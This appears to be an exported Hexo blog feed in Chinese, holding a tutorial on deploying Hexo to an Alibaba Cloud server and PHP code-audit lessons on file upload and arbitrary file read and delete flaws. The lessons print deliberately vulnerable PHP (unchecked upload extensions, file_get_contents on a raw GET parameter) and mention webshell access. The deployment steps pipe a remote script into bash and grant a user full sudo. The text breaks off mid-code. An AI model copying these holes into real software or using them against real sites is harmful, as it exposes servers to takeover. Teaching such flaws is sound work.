href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">教程</a></li></ul><p><strong>2.安装Nodejs</strong></p><p>到<a href="http://nodejs.cn/download/" target="_blank" rel="noopener">Node.js官网</a>下载<code>.exe</code>文件，安装选项全部默认。安装好之后，按<code>Win+R</code>打开cmd命令提示符，输入<code>node -v</code>和<code>npm -v</code>，若出现版本号，则说明安装成功。</p><p>使用npm阿里的国内镜像进行加速下载</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.安装Hexo</strong></p><p>先创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键<code>git bash here</code>打开）。</p><p>定位到该目录下，输入<code>npm install -g hexo-cli</code>安装<code>Hexo</code>。可能会有几个报错，不用理会。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完后输入<code>hexo -v</code>,若出现版本号则，说明安装成功。</p><p>接下来初始化一下<code>hexo</code>,即初始化我们的博客，输入<code>hexo init</code>初始化文件夹</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init MyBlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建完成后，指定文件夹<code>MyBlog</code>目录下有：</p><ul><li><code>node_modules</code>: 依赖包</li><li><code>public</code>：存放生成的页面</li><li><code>scaffolds</code>：生成文章的一些模板</li><li><code>source</code>：用来存放你的文章</li><li><code>themes</code>：主题**</li><li><code>_config.yml</code>: 博客的配置文件**</li></ul><p>输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器预览</p><pre class="line-numbers language-bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s1.ax1x.com/2020/03/12/8VdlGD.png" alt="Hexo"></p><h3 id="生成ssh公钥"><a href="#生成ssh公钥" class="headerlink" title="生成ssh公钥"></a>生成ssh公钥</h3><p>在本地桌面点击右键<code>Git Bash Here</code>打开Git终端，执行如下命令`,一路回车</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候它会告诉你已经生成了<code>.ssh</code>的文件夹。在<code>git bash</code>中输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出的内容就是公钥信息了</p><h3 id="阿里云服务器环境搭建"><a href="#阿里云服务器环境搭建" class="headerlink" title="阿里云服务器环境搭建"></a>阿里云服务器环境搭建</h3><p>安装<code>Git</code></p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建<code>Git</code>账户</p><pre class="line-numbers language-bash"><code class="language-bash">adduser <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加账户权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 740 /etc/sudoersvim /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>找到</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## Allow root to run any commands anywhere</span>root    ALL<span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>     ALL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>添加以下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span>   ALL<span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>     ALL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存退出并改回权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 400 /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置<code>git</code>账户密码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">passwd</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换至<code>git</code>用户，创建 <code>~/.ssh</code> 文件夹和 <code>~/.ssh/authorized_keys</code> 文件，并赋予相应的权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">su</span> <span class="token function">git</span><span class="token function">mkdir</span> ~/.sshvim ~/.ssh/authorized_keys<span class="token comment" spellcheck="true"># 然后将win10中生成的id_rsa.pub文件中的公钥复制到authorized_keys</span><span class="token function">chmod</span> 600 /home/git/.ssh/authorized_keys<span class="token function">chmod</span> 700 /home/git/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地<code>Git</code>终端中测试是否能免密登录<code>git</code>，其中<code>SERVER</code>为填写自己的云主机<code>IP</code>，执行输入<code>yes</code>后不用密码就说明好了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -v git@SERVER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#repo作为为Git仓库目录</span><span class="token function">mkdir</span> /var/repo<span class="token function">chown</span> -R git:git /var/repo<span class="token function">chmod</span> -R 755 /var/repo<span class="token comment" spellcheck="true">#hexo作为网站根目录</span><span class="token function">mkdir</span> /var/www/hexo<span class="token function">chown</span> -R git:git /var/www/hexo<span class="token function">chmod</span> -R 755 /var/www/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后创建一个裸的 <code>Git</code> 仓库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> var/repo<span class="token function">git</span> init --bare hexoBlog.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建一个新的 <code>Git</code> 钩子，用于自动部署 在 <code>/var/repo/hexoBlog.git</code> 下，有一个自动生成的 <code>hooks</code> 文件夹。我们需要在里边新建一个新的钩子文件 <code>post-receive</code>。</p><pre class="line-numbers language-bash"><code class="language-bash">vim /var/repo/hexoBlog.git/hooks/post-receive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按 <code>i</code> 键进入文件的编辑模式，在该文件中添加两行代码（将下边的代码粘贴进去)，指定 <code>Git</code> 的工作树（源代码）和 <code>Git</code> 目录（配置文件等）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">git</span> --work-tree<span class="token operator">=</span>/var/www/hexo --git-dir<span class="token operator">=</span>/var/repo/hexoBlog.git checkout -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后，按 <code>Esc</code> 键退出编辑模式，输入”<code>:wq</code>” 保存退出。</p><p>修改文件权限，使得其可执行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R git:git /var/repo/hexoBlog.git/hooks/post-receive<span class="token function">chmod</span> +x /var/repo/hexoBlog.git/hooks/post-receive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>到此为止 <code>Git</code> 仓库就搭建完成了。</p><h3 id="阿里云服务器配置Nginx"><a href="#阿里云服务器配置Nginx" class="headerlink" title="阿里云服务器配置Nginx"></a>阿里云服务器配置Nginx</h3><p>用宝塔面板来一键部署Nginx <code>Linux</code>面板6.0安装命令(暂时仅兼容<code>Centos7.x</code>，其它系统版本请安装5.9稳定版)：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y <span class="token function">wget</span> <span class="token operator">&amp;&amp;</span> <span class="token function">wget</span> -O install.sh http://download.bt.cn/install/install_6.0.sh <span class="token operator">&amp;&amp;</span> <span class="token function">bash</span> install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Linux</code>面板6.0升级专业版</p><pre class="line-numbers language-bash"><code class="language-bash">curl http://download.bt.cn/install/update6.sh<span class="token operator">|</span><span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后会显示面板后台地址·账号·密码。打开面板后台地址登陆面板，选择<code>Nginx</code>的部署方案，静静等待部署。</p><p>部署完成，点击网站-添加站点-输入域名(没有域名的输入自己的<code>IP</code>地址)-底部的<code>PHP</code>版本选择”纯静态”-提交。 </p><p>网站创建完成后点击设置-配置文件</p><pre class="line-numbers language-bash"><code class="language-bash">server<span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"># server_name 填写自己的域名</span>    server_name luckyzmj.cn blog.luckyzmj.cn<span class="token punctuation">;</span>    index index.php index.html index.htm default.php default.htm default.html<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true"># 这里root填写自己的网站根目录，修改为/var/www/hexo</span>    root /var/www/hexo<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-保存</p><p>点击设置-网站目录，修改为<code>/var/www/hexo</code> ，保存</p><p>重启宝塔面板服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> bt restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="本地Hexo部署到阿里云服务器"><a href="#本地Hexo部署到阿里云服务器" class="headerlink" title="本地Hexo部署到阿里云服务器"></a>本地Hexo部署到阿里云服务器</h3><p>进入到本地<code>Hexo</code>博客的文件夹<code>MyBlog</code>,右键点击<code>Git Bash Here</code>，输入命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#定义邮箱(更换为你的邮箱地址就行)</span><span class="token function">git</span> config --global user.email <span class="token string">"you@example.com"</span><span class="token comment" spellcheck="true">#定义名称(更换自定义一个名称就行)</span><span class="token function">git</span> config --global user.name <span class="token string">"Your Name"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配置<code>_config.yml</code>,完成自动化部署 </p><p>打开本地<code>Hexo</code>博客的文件夹<code>MyBlog</code>文件夹下的<code>_config.yml</code>, 找到<code>deploy</code></p><pre class="line-numbers language-bash"><code class="language-bash">deploy:  type: <span class="token function">git</span>  <span class="token comment" spellcheck="true">#server改为你的服务IP地址或解析后的域名</span>  <span class="token comment" spellcheck="true">#例如我改为repo: git@luckyzmj.cn:/var/repo/blog.git</span>  repo: git@server:/var/repo/blog.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后，即可测试部署</p><p>再进入到本地<code>Hexo</code>博客的文件夹<code>MyBlog</code>,右键点击<code>Git Bash Here</code>，输入命令</p><pre class="line-numbers language-bash"><code class="language-bash">hexo clean hexo g -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不报错说明完成，打开浏览器输入你的域名或<code>ip</code>地址就可以看到你部署的<code>Hexo</code>博客了。 </p><p>到此为止，我们已经成功部完成，并且访问自己的服务器端比访问Github快多了。</p><blockquote><h3 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h3></blockquote><p>在部署过程中，执行 hexo d发现部署老是出错，什么权限不允许之类的，这里我们需要检查我们在上述的<code>git</code>操作部署是否使用了<code>git</code>用户操作，若是没有，需要给相应的目录更改用户组 使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R git:git /var/repo/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令递归的将<code>repo</code>目录及其子目录用户组设置为<code>git</code>。 同时使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chown</span> -R git:git /var/www/hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样即可解决此类问题。</p><p>还有一个问题就是绑定域名后不能访问。原因是在国内任何域名只要绑定到国内的服务器主机上都必须去工信部和公安部备案完后才能正常使用。如果是港澳台的服务器或者是国外的服务器则可以不需要备案。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/weixin_33907511/article/details/91398208?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33907511/article/details/91398208?utm_source=distribute.pc_relevant.none-task</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：文件上传漏洞</title>
      <link href="/posts/7bd3dcf6.html"/>
      <url>/posts/7bd3dcf6.html</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote><p>文件上传漏洞一些web应用程序中允许上传图片，文本或者其他资源到指定的位置。 文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码。</p></blockquote><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><blockquote><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞 , 攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为。如果上传的文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。如果上传的文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个webshell到服务器上 完全控制系统或致使系统瘫痪。</p></blockquote><h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><ul><li>文件可以上传</li><li>能获取文件上传后的路径</li><li>上传文件可以被访问</li><li>上传文件可以被执行</li></ul><h3 id="文件上传的可控点"><a href="#文件上传的可控点" class="headerlink" title="文件上传的可控点"></a>文件上传的可控点</h3><ul><li>Content-Length,即上传内容大小</li><li>MAX_FILE_SIZE,即上传内容的最大长度</li><li>filename,即上传文件名</li><li>Content-Type,即上传文件类型</li><li>请求包中的乱码字段，即是所上传文件的内容</li><li>有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</li></ul><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ul><li>上传点都调用同一个上传类</li><li>黑盒寻找上传点，代码定位</li></ul><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>这里搭建上传页面，一些函数就不再做过多介绍，之前博客里的这篇文章<a href="https://blog.csdn.net/qq_43573676/article/details/109463040" target="_blank" rel="noopener">详解PHP的文件操作</a>里面有详细介绍哦~</p><p>upload.html:</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>upload.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 如果传过来的文件的大小等于0</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 弹出请上传文件并返回之前的页面</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('请上传文件！');location.href='"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_REFERER"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"';&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token shell-comment comment"># 定义常量PATH，常量的值为当前目录的上级目录</span>    <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token string">'C:\phpstudy_pro\WWW\A_testCode\upload\files'</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果fullpath是一个文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 弹出上传成功并跳回上传页面</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功！');location.href='"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"HTTP_REFERER"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 否则生成以fullpath命名的文件夹</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 随机命名文件名</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 用strrchr()函数获取上传文件的后缀名，赋值给filetype</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 重新命名文件名为：随机数字+固定文件后缀</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token variable">$filetype</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 将上传的文件上传到指定的文件夹中，并重新命名</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$fullpath</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓包之后，你能看到的，全部都可以修改，主要是改一些检测的可控点进行绕过，或者利用Web容器的解析漏洞进行绕过等等：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201128165551323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>菜刀连接：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112817010294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li><p>检测文件上传内容</p><p>  -黑白名单验证，检测文件扩展名是否合法<br>  -MIME验证，检测文件的MIME类型</p></li><li><p>限制文件大小</p></li><li><p>更改临时文件夹的路径</p></li><li><p>读取上传文件的绝对路径与文件名称</p></li><li><p>隐藏文件路径</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：任意文件读取及删除漏洞</title>
      <link href="/posts/4f41b883.html"/>
      <url>/posts/4f41b883.html</url>
      
        <content type="html"><![CDATA[<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><blockquote><p>通过提交专门设计的 输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感文件，正常读取的文件没有经过校验或者校验不严格，用户可以控制这个变量或者变量读取任意文件</p></blockquote><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><blockquote><p>任意文件读取，是Web安全中的高危漏洞，它可以泄露源码，数据库配置文件等等，导致网站处于极度不安全的状态</p></blockquote><h4 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h4><ul><li>fopen()</li><li>file_get_contents()</li><li>fread()</li><li>fgets()</li><li>fgetss()</li><li>file()</li><li>fpassthru()</li><li>parse_ini_file()</li><li>readfile()</li></ul><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//    $fp = fopen($filename,"r") or die("无法读取文件");</span><span class="token comment" spellcheck="true">//    $data = fread($fp);</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"$filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;h1>任意文件读取&lt;/h1>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201203180318162.png" alt="在这里插入图片描述"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><blockquote><p>同样是被删除文件的变量用户可控，且没有进行严格的校检，所以导致任意文件删除，再配合目录遍历，删除硬盘上的其他文件。</p></blockquote><h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><blockquote><p>这个漏洞的危害就不用多说了吧，人家能删除你电脑上的任意一个文件，说不定哪天一重启服务器发现崩溃了，都不知道哪里出了问题</p></blockquote><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>首先在当前目录及上级目录创建1.txt文件以作测试<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201203205329930.png" alt="在这里插入图片描述"></p><p>index.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 判断GET传值的文件或目录是否存在</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 